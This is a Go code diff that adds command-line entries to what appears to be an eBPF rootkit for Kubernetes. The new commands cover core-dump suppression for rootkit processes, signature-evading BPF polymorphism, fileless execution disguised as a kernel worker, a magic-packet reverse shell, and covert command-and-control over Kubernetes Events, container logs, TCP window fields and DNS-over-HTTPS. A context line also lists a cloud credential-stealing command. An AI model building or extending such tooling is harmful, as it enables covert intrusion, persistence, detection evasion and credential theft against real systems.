@@ -246,6 +246,76 @@ var cmdPcapBlind = &cobra.Command{
 	RunE:  pcapBlindCmd,
 }
 
+var cmdCoredump = &cobra.Command{
+	Use:   "coredump-suppress",
+	Short: "Core dump suppression",
+	Long:  "coredump-suppress hooks do_coredump to prevent memory dumps of rootkit processes",
+	RunE:  coredumpCmd,
+}
+
+var cmdTimeskew = &cobra.Command{
+	Use:   "timeskew",
+	Short: "Timestamp manipulation",
+	Long:  "timeskew hooks clock functions to skew time responses for targeted processes",
+	RunE:  timeskewCmd,
+}
+
+var cmdPolymorph = &cobra.Command{
+	Use:   "polymorph",
+	Short: "BPF polymorphism",
+	Long:  "polymorph mutates BPF bytecode (randomize maps, reorder instructions, insert NOPs) to evade signatures",
+	RunE:  polymorphCmd,
+}
+
+var cmdFileless = &cobra.Command{
+	Use:   "fileless-exec",
+	Short: "Fileless execution",
+	Long:  "fileless-exec uses memfd_create + execveat for disk-free payload execution",
+	RunE:  filelessCmd,
+}
+
+var cmdXDPShell = &cobra.Command{
+	Use:   "xdp-shell",
+	Short: "XDP reverse shell",
+	Long:  "xdp-shell spawns a reverse shell triggered by crafted XDP magic packets",
+	RunE:  xdpShellCmd,
+}
+
+var cmdBPFIPC = &cobra.Command{
+	Use:   "bpf-ipc",
+	Short: "BPF map IPC",
+	Long:  "bpf-ipc enables inter-program communication via BPF maps for coordinated operations",
+	RunE:  bpfIPCCmd,
+}
+
+var cmdK8sEventC2 = &cobra.Command{
+	Use:   "k8s-event-c2",
+	Short: "K8s Event C2",
+	Long:  "k8s-event-c2 uses Kubernetes Event objects as a covert command-and-control channel",
+	RunE:  k8sEventC2Cmd,
+}
+
+var cmdContainerLogC2 = &cobra.Command{
+	Use:   "container-log-c2",
+	Short: "Container log C2",
+	Long:  "container-log-c2 hides C2 data steganographically in container stdout/stderr logs",
+	RunE:  containerLogC2Cmd,
+}
+
+var cmdTCPStego = &cobra.Command{
+	Use:   "tcp-stego",
+	Short: "TCP window steganography",
+	Long:  "tcp-stego encodes covert data in TCP window size field via TC egress BPF",
+	RunE:  tcpStegoCmd,
+}
+
+var cmdDoHC2 = &cobra.Command{
+	Use:   "doh-c2",
+	Short: "DNS-over-HTTPS C2",
+	Long:  "doh-c2 routes C2 traffic through DoH TXT record queries to bypass DNS monitoring",
+	RunE:  dohC2Cmd,
+}
+
 var cmdCloudMeta = &cobra.Command{
 	Use:   "meta",
 	Short: "steal cloud metadata credentials",
@@ -911,4 +981,189 @@ func init() {
 		"",
 		"output file path (stdout if not set)")
 	KUBEDaggerClient.AddCommand(cmdPcapBlind)
+
+	cmdCoredump.PersistentFlags().StringVar(
+		&options.CoredumpPIDs,
+		"pids",
+		"",
+		"comma-separated PIDs to suppress core dumps for")
+	cmdCoredump.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdCoredump)
+
+	cmdTimeskew.PersistentFlags().StringVar(
+		&options.TimeskewPIDs,
+		"target-pids",
+		"",
+		"comma-separated PIDs to apply time skew")
+	cmdTimeskew.PersistentFlags().StringVar(
+		&options.TimeskewOffset,
+		"offset",
+		"3600",
+		"time offset in seconds")
+	cmdTimeskew.PersistentFlags().StringVar(
+		&options.TimeskewMode,
+		"mode",
+		"fixed",
+		"skew mode: fixed or random")
+	cmdTimeskew.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdTimeskew)
+
+	cmdPolymorph.PersistentFlags().StringVar(
+		&options.PolymorphSeed,
+		"seed",
+		"",
+		"mutation seed for reproducible polymorphism")
+	cmdPolymorph.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdPolymorph)
+
+	cmdFileless.PersistentFlags().StringVar(
+		&options.FilelessPayload,
+		"payload",
+		"",
+		"base64-encoded payload to execute")
+	cmdFileless.PersistentFlags().StringVar(
+		&options.FilelessFakeName,
+		"name",
+		"[kworker/0:1]",
+		"fake process name for /proc/self/exe")
+	cmdFileless.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdFileless)
+
+	cmdXDPShell.PersistentFlags().StringVar(
+		&options.XDPShellConnect,
+		"connect",
+		"",
+		"address:port for reverse shell connection")
+	cmdXDPShell.PersistentFlags().StringVar(
+		&options.XDPShellProtocol,
+		"protocol",
+		"icmp",
+		"trigger protocol: icmp, udp, or tcp-custom")
+	cmdXDPShell.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdXDPShell)
+
+	cmdBPFIPC.PersistentFlags().StringVar(
+		&options.BPFIPCAction,
+		"action",
+		"status",
+		"IPC action: send, recv, or status")
+	cmdBPFIPC.PersistentFlags().StringVar(
+		&options.BPFIPCChannel,
+		"channel",
+		"default",
+		"IPC channel identifier")
+	cmdBPFIPC.PersistentFlags().StringVar(
+		&options.BPFIPCMessage,
+		"message",
+		"",
+		"message to send (for send action)")
+	cmdBPFIPC.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdBPFIPC)
+
+	cmdK8sEventC2.PersistentFlags().StringVar(
+		&options.K8sC2Namespace,
+		"namespace",
+		"default",
+		"Kubernetes namespace for Event C2 channel")
+	cmdK8sEventC2.PersistentFlags().StringVar(
+		&options.K8sC2Beacon,
+		"beacon-interval",
+		"30",
+		"beacon interval in seconds")
+	cmdK8sEventC2.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdK8sEventC2)
+
+	cmdContainerLogC2.PersistentFlags().StringVar(
+		&options.LogC2Container,
+		"container",
+		"",
+		"target container name for log-based C2")
+	cmdContainerLogC2.PersistentFlags().StringVar(
+		&options.LogC2Encoding,
+		"encoding",
+		"base85",
+		"encoding scheme: base85, whitespace, or unicode")
+	cmdContainerLogC2.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdContainerLogC2)
+
+	cmdTCPStego.PersistentFlags().StringVar(
+		&options.TCPStegoData,
+		"data",
+		"",
+		"data to encode in TCP window size field")
+	cmdTCPStego.PersistentFlags().StringVar(
+		&options.TCPStegoDest,
+		"dest",
+		"",
+		"destination ip:port for steganographic transmission")
+	cmdTCPStego.PersistentFlags().StringVar(
+		&options.TCPStegoBPP,
+		"bits-per-packet",
+		"2",
+		"bits encoded per packet: 2 or 4")
+	cmdTCPStego.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdTCPStego)
+
+	cmdDoHC2.PersistentFlags().StringVar(
+		&options.DoHC2Resolver,
+		"resolver",
+		"cloudflare",
+		"DoH resolver: cloudflare, google, or custom URL")
+	cmdDoHC2.PersistentFlags().StringVar(
+		&options.DoHC2Domain,
+		"domain",
+		"",
+		"authoritative domain for C2 TXT record queries")
+	cmdDoHC2.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file path (stdout if not set)")
+	KUBEDaggerClient.AddCommand(cmdDoHC2)
 }
